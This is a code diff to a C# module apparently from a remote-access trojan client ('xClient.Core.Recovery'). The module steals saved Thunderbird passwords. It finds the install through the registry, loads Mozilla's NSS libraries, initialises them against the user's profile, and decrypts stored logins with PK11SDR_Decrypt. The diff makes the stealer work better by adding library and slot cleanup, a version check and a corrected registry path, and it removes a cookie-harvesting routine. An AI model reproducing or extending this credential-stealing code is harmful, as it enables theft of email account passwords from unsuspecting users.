@@ -19,7 +19,14 @@ namespace xClient.Core.Recovery.Other
     /// </summary>
     public static class Thunderbird
     {
-        public static IntPtr nssModule;
+        private static IntPtr _nssModule;
+
+        private static IntPtr _dll1;
+        private static IntPtr _dll2;
+        private static IntPtr _dll3;
+        private static IntPtr _dll4;
+        private static IntPtr _dll5;
+        private static long _keySlot;
 
         private static DirectoryInfo thunderbirdPath;
         private static DirectoryInfo thunderbirdProfilePath;
@@ -86,84 +93,55 @@ namespace xClient.Core.Recovery.Other
             catch (Exception e)
             {
             }
+
+            PK11_FreeSlot(_keySlot);
+            NSS_Shutdown();
+
+            if (_dll1 != IntPtr.Zero)
+                FreeLibrary(_dll1);
+            if (_dll2 != IntPtr.Zero)
+                FreeLibrary(_dll2);
+            if (_dll3 != IntPtr.Zero)
+                FreeLibrary(_dll3);
+            if (_dll4 != IntPtr.Zero)
+                FreeLibrary(_dll4);
+            if (_dll5 != IntPtr.Zero)
+                FreeLibrary(_dll5);
+
+            if (_nssModule != IntPtr.Zero)
+                FreeLibrary(_nssModule);
+
             return thunderbirdPasswords;
         }
 
-        /// <summary>
-        /// Recover thunderbird Cookies from the SQLite3 Database
-        /// </summary>
-        /// <returns>List of Cookies found</returns>
-        public static List<thunderbirdCookie> GetSavedCookies()
-        {
-            List<thunderbirdCookie> data = new List<thunderbirdCookie>();
-            SQLiteHandler sql = new SQLiteHandler(thunderbirdCookieFile.FullName);
-            if (!sql.ReadTable("moz_cookies"))
-                throw new Exception("Could not read cookie table");
-
-            int totalEntries = sql.GetRowCount();
-
-            for (int i = 0; i < totalEntries; i++)
-            {
-                try
-                {
-                    string h = sql.GetValue(i, "host");
-                    //Uri host = new Uri(h);
-                    string name = sql.GetValue(i, "name");
-                    string val = sql.GetValue(i, "value");
-                    string path = sql.GetValue(i, "path");
-
-                    bool secure = sql.GetValue(i, "isSecure") == "0" ? false : true;
-                    bool http = sql.GetValue(i, "isSecure") == "0" ? false : true;
-
-                    // if this fails we're in deep shit
-                    long expiryTime = long.Parse(sql.GetValue(i, "expiry"));
-                    long currentTime = ToUnixTime(DateTime.Now);
-                    DateTime exp = FromUnixTime(expiryTime);
-                    bool expired = currentTime > expiryTime;
-
-                    data.Add(new thunderbirdCookie()
-                    {
-                        Host = h,
-                        ExpiresUTC = exp,
-                        Expired = expired,
-                        Name = name,
-                        Value = val,
-                        Path = path,
-                        Secure = secure,
-                        HttpOnly = http
-                    });
-                }
-                catch (Exception)
-                {
-                    return data;
-                }
-            }
-            return data;
-        }
+   
         #endregion
 
         #region Functions
+
         private static void InitializeDelegates(DirectoryInfo thunderbirdProfilePath, DirectoryInfo thunderbirdPath)
         {
             //Return if under thunderbird 35 (35+ supported)
             //thunderbird changes their DLL heirarchy/code with different releases
             //So we need to avoid trying to load a DLL in the wrong order
             //To prevent pop up saying it could not load the DLL
-            //if (new Version(FileVersionInfo.GetVersionInfo(thunderbirdPath.FullName + "\\thunderbird.exe").FileVersion).Major < new Version("35.0.0").Major)
-           //     return;
+            if (new Version(FileVersionInfo.GetVersionInfo(thunderbirdPath.FullName + "\\thunderbird.exe").FileVersion).Major < new Version("35.0.0").Major)
+                 return;
 
-            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr100.dll");
-            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp100.dll");
-            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr120.dll");
-            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp120.dll");
-            NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\mozglue.dll");
-            nssModule = NativeMethods.LoadLibrary(thunderbirdPath.FullName +  "\\nss3.dll");
-            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "NSS_Init");
-            NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
-            var test = NSS_Init(thunderbirdProfilePath.FullName);
-            long keySlot = PK11_GetInternalKeySlot();
-            PK11_Authenticate(keySlot, true, 0);
+            _dll1 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr100.dll");
+            _dll2 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp100.dll");
+            _dll3 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr120.dll");
+            _dll4 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp120.dll");
+            _dll5 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\mozglue.dll");
+            _nssModule = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\nss3.dll");
+
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSS_Init");
+            NSS_InitPtr NSS_Init = (NSS_InitPtr) Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
+            NSS_Init(thunderbirdProfilePath.FullName);
+            _keySlot = PK11_GetInternalKeySlot();
+            PK11_Authenticate(_keySlot, true, 0);
         }
+
         private static DateTime FromUnixTime(long unixTime)
         {
             DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
@@ -204,9 +182,9 @@ namespace xClient.Core.Recovery.Other
             // get thunderbird path from registry
             using (RegistryKey key = PlatformHelper.Is64Bit ?
                 RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
-                    @"SOFTWARE\Wow6432Node\Mozilla\Mozilla firefox") :
+                    @"SOFTWARE\Wow6432Node\Mozilla\Mozilla Thunderbird") :
                 RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
-                    @"SOFTWARE\Mozilla\Mozilla firefox"))
+                    @"SOFTWARE\Mozilla\Mozilla Thunderbird"))
             {
                 if (key == null) return null;
 
@@ -233,23 +211,13 @@ namespace xClient.Core.Recovery.Other
         #endregion
 
         #region WinApi
-        // Credit: http://www.pinvoke.net/default.aspx/kernel32.loadlibrary
-        private static IntPtr LoadWin32Library(string libPath)
-        {
-            if (String.IsNullOrEmpty(libPath))
-                throw new ArgumentNullException("libPath");
 
-            IntPtr moduleHandle = NativeMethods.LoadLibrary(libPath);
-            if (moduleHandle == IntPtr.Zero)
-            {
-                var lasterror = Marshal.GetLastWin32Error();
-                var innerEx = new Win32Exception(lasterror);
-                innerEx.Data.Add("LastWin32Error", lasterror);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool FreeLibrary(IntPtr hModule);
 
-                throw new Exception("can't load DLL " + libPath, innerEx);
-            }
-            return moduleHandle;
-        }
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int PK11_FreeSlotPtr(long keySlot);
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         private delegate long NSS_InitPtr(string configdir);
@@ -265,6 +233,9 @@ namespace xClient.Core.Recovery.Other
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int NSS_ShutdownPtr();
 
         [StructLayout(LayoutKind.Sequential)]
         private struct TSECItem
@@ -335,38 +306,52 @@ namespace xClient.Core.Recovery.Other
         #endregion
 
         #region Delegate Handling
+        private static int NSS_Shutdown()
+        {
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSS_Shutdown");
+            NSS_ShutdownPtr ptr = (NSS_ShutdownPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_ShutdownPtr));
+            return ptr();
+        }
+
         // Credit: http://www.codeforge.com/article/249225
         private static long PK11_GetInternalKeySlot()
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_GetInternalKeySlot");
             PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
             return ptr();
         }
         private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11_Authenticate");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_Authenticate");
             PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
             return ptr(slot, loadCerts, wincx);
         }
         private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSSBase64_DecodeBuffer");
             NSSBase64_DecodeBufferPtr ptr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSSBase64_DecodeBufferPtr));
             return ptr(arenaOpt, outItemOpt, inStr, inLen);
         }
         private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
         {
-            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11SDR_Decrypt");
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11SDR_Decrypt");
             PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
             return ptr(ref data, ref result, cx);
         }
+        private static int PK11_FreeSlot(long keySlot)
+        {
+            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_FreeSlot");
+            PK11_FreeSlotPtr ptr = (PK11_FreeSlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_FreeSlotPtr));
+            return ptr(keySlot);
+        }
+
         private static string Decrypt(string cypherText)
         {
             StringBuilder sb = new StringBuilder(cypherText);
             int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
             TSECItem tSecDec = new TSECItem();
             TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
-            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
+            if ((PK11SDR_Decrypt(ref item, ref tSecDec, 0)) == 0)
             {
                 if (tSecDec.SECItemLen != 0)
                 {
@@ -378,31 +363,5 @@ namespace xClient.Core.Recovery.Other
             return null;
         }
         #endregion
-    }
-    public class thunderbirdPassword
-    {
-        public string Username { get; set; }
-        public string Password { get; set; }
-        public Uri Host { get; set; }
-        public override string ToString()
-        {
-            return string.Format("User: {0}{3}Pass: {1}{3}Host: {2}", Username, Password, Host.Host, Environment.NewLine);
-        }
-    }
-    public class thunderbirdCookie
-    {
-        public string Host { get; set; }
-        public string Name { get; set; }
-        public string Value { get; set; }
-        public string Path { get; set; }
-        public DateTime ExpiresUTC { get; set; }
-        public bool Secure { get; set; }
-        public bool HttpOnly { get; set; }
-        public bool Expired { get; set; }
-
-        public override string ToString()
-        {
-            return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, Host, Name, Value, Path, Expired, HttpOnly, Secure);
-        }
     }
 }
